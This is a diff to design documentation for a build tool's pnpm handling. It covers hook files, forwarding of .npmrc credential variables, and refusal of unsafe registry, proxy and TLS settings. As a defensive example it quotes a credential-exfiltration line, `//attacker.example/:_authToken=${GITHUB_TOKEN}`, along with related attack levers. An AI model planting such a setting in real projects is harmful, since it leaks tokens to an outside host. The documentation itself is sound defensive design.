@@ -68,7 +68,8 @@ declaration, and measure feeds it as an ordinary settled upstream reference.
 ## Measure
 
 `Measure` digests the manager lockfile and the project `.npmrc` when present.
-For pnpm it also digests `.pnpmfile.cjs` and `pnpm-workspace.yaml` when present.
+For pnpm it also digests `pnpm-workspace.yaml` and the hook file pnpm loads
+(`.pnpmfile.mjs`, else `.pnpmfile.cjs`) when present.
 
 ```ts
 Content = {
@@ -223,11 +224,16 @@ The pnpm commands are:
 
 ```text
 pnpm fetch --frozen-lockfile --ignore-scripts --reporter=append-only \
-  --store-dir <store>
+  <hooks> --store-dir <store>
 
 pnpm install --offline --frozen-lockfile --ignore-scripts \
-  --reporter=append-only --store-dir <store>
+  --reporter=append-only <hooks> --store-dir <store>
 ```
+
+`<hooks>` is `--pnpmfile <projectRoot>/<hook file> --global-pnpmfile=`, where
+the hook file is `.pnpmfile.mjs`, else `.pnpmfile.cjs`, and `--ignore-pnpmfile`
+when neither exists. See
+[Lifecycle scripts](#lifecycle-scripts).
 
 `<store>` is `<projectRoot>/.flows/store/pnpm` unless the composition passed
 `storeDirectory`.
@@ -241,8 +247,51 @@ link, and manifest operations fail with `PackageManagerError { code:
 
 Package-manager children use `extendEnv: false`. They receive deterministic
 locale/color settings, selected bootstrap and network variables, and variables
-explicitly referenced as `${NAME}` in live values of the project `.npmrc`.
-Blank lines and lines beginning with `;` or `#` are ignored when selecting variables.
+referenced as `${NAME}` in live values of the project `.npmrc`.
+The file is read the way pnpm's `ini` decoder reads it: lines split on `\r` as
+well as `\n`, lines beginning with `;` or `#` are comments, and a quoted value
+is decoded with `JSON.parse`, so `"\u0024{NAME}"` counts as `${NAME}`.
+A placeholder in a setting name is refused.
+`PATH` keeps only absolute entries, because the child's working directory is
+the project root.
+
+A placeholder is allowed only as the whole value of a registry-scoped
+credential setting: `//host/path/:_authToken`, `:_auth`, `:_password`, or
+`:username`. pnpm sends that value to the host the setting names, and the
+repository writes that host. A placeholder anywhere else, such as in
+`registry`, a scoped registry, a proxy, or an unscoped `_authToken`, is refused
+with `unsafe_configuration`, because the repository would choose the server
+that receives the host variable.
+
+The setting's host must also be on the operator's `credentialHosts` list
+(`PackageManager.Options.credentialHosts`, default `["registry.npmjs.org"]`).
+Otherwise the setting is refused with `unsafe_configuration` before any child
+starts, so `//attacker.example/:_authToken=${GITHUB_TOKEN}` never reaches pnpm.
+Entries are `host` or `host:port` and match the setting's authority exactly,
+ignoring case. The build CLI reads the list from the host variable
+`SMITHERS_NPM_CREDENTIAL_HOSTS`, a comma-separated list such as
+`registry.npmjs.org,npm.pkg.github.com`, and never from the checkout.
+
+While a credential is forwarded, the repository cannot choose how it travels.
+`.npmrc` settings `proxy`, `https-proxy`, `http-proxy`, `noproxy`,
+`strict-ssl`, `ca`, `cafile`, `cert`, and `local-address`, and any `registry`
+or `@scope:registry` that is not `https://`, are refused with
+`unsafe_configuration`. pnpm 10 also reads `httpsProxy`, `httpProxy`, and
+`strictSsl` from `pnpm-workspace.yaml`, where they outrank the environment, so
+`pnpm fetch` and `pnpm install` get `--config.proxy=`,
+`--config.https-proxy=<HTTPS_PROXY>`, `--config.http-proxy=<HTTP_PROXY>`,
+`--config.noproxy=<NO_PROXY>`, `--config.strict-ssl=true`, and `--config.ca=`.
+The proxy values come from the host environment (lowercase names too) or are
+empty, and they appear in the child's argument list.
+
+Two gaps remain, and both need an attacker on the network path, not a server
+the repository names. A `pnpm-workspace.yaml` registry or a lockfile tarball URL
+may use `http://` for an allowed host, which sends the credential in cleartext.
+A `pnpm-workspace.yaml` `cafile` is not pinned.
+
+Only pnpm 10 and earlier expand `${NAME}` in a project `.npmrc`. pnpm 11
+ignores project-level placeholders with a warning, so forwarding a variable has
+no effect there. The repository's target attributes choose the pnpm version.
 
 Literal auth tokens, passwords, client keys (`key`), one-time passwords (`otp`),
 key files, and certificate files in `.npmrc` are refused. Placeholders that
@@ -287,12 +336,21 @@ declaring another is not allowed.
 Every supported command passes `--ignore-scripts`. Arbitrary package lifecycle
 code needs a separate non-sealed execution model and is not part of this flow.
 
-`--ignore-scripts` does not disable `.pnpmfile.cjs`. Project pnpm hooks remain
-supported: Measure hashes that file and `pnpm-workspace.yaml`, and FetchPnpm
-and Link declare both reads. Link also declares workspace member
-`package.json` reads. Hook imports and other dynamic reads are not a hermetic
+`--ignore-scripts` does not disable pnpm hooks. A project `.pnpmfile.mjs` or
+`.pnpmfile.cjs` is repository JavaScript that pnpm executes during fetch and
+link, with the manager's selected environment, under the install flow's
+declared `proc:spawn` capability. Only the file pnpm loads by default is
+loaded: `.pnpmfile.mjs`, else `.pnpmfile.cjs`. Every command names it with
+`--pnpmfile` and clears the global hook with `--global-pnpmfile=`, or passes
+`--ignore-pnpmfile` when neither exists, so a `pnpmfile` or `globalPnpmfile`
+setting in `pnpm-workspace.yaml` is never loaded. Measure hashes the hook file
+and `pnpm-workspace.yaml`, and FetchPnpm and Link declare their reads. Link
+also declares workspace member `package.json` reads. Hook imports and other dynamic reads are not a hermetic
 input closure; the expected boundary keeps these actions out of the shared
-cache.
+cache. Measure hashes only the hook file's own bytes. A hook that runs
+`require("./impl.cjs")` executes `impl.cjs` undigested, and a change to
+`impl.cjs` does not move the store manifest. Keep the hook self-contained, or
+change the hook file whenever what it imports changes.
 
 ## Next
 
